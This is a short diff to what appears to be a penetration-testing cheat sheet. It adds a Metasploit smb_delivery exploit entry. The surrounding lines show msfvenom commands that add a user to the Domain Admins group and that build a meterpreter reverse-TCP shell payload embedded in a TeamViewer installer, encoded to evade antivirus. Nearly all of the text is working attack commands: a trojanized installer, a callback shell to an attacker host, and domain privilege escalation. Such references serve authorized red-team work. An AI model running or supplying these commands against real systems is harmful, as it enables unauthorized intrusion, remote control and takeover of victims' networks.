@@ -4245,6 +4245,12 @@ $ msfvenom -p windows/x64/exec cmd='net group "Domain Admins" james /add /domain
 $ msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=<IP Address> LPORT=<Port> -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
 ```
 
+- Metasploit SMB Delivery
+
+```
+msf> use exploit/windows/smb/smb_delivery
+```
+
 #12. - Evasion
 -----------------------------------------
 
